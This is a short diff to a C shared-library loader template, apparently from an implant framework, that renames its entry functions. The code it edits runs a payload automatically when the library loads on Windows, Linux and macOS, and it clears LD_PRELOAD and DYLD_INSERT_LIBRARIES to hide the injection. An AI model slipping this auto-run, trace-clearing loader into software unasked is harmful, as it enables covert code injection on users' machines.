@@ -2,9 +2,9 @@
 
 #ifdef __WIN32
 
-DWORD WINAPI Enjoy()
+DWORD WINAPI Start()
 {
-    Start();
+    StartW();
     return 0;
 }
 
@@ -20,7 +20,7 @@ BOOL WINAPI DllMain(
         // Return FALSE to fail DLL load.
     {
         // {{if .Config.IsSharedLib}}
-        HANDLE hThread = CreateThread(NULL, 0, Enjoy, NULL, 0, NULL);
+        HANDLE hThread = CreateThread(NULL, 0, Start, NULL, 0, NULL);
         // CreateThread() because otherwise DllMain() is highly likely to deadlock.
         // {{end}}
     }
@@ -40,24 +40,24 @@ BOOL WINAPI DllMain(
 #elif __linux__
 #include <stdlib.h>
 
-void Start();
+void StartW();
 
 static void init(int argc, char **argv, char **envp)
 {
     unsetenv("LD_PRELOAD");
     unsetenv("LD_PARAMS");
-    Start();
+    StartW();
 }
 __attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
 #elif __APPLE__
 #include <stdlib.h>
-void Start();
+void StartW();
 
 __attribute__((constructor)) static void init(int argc, char **argv, char **envp)
 {
     unsetenv("DYLD_INSERT_LIBRARIES");
     unsetenv("LD_PARAMS");
-    Start();
+    StartW();
 }
 
 #endif
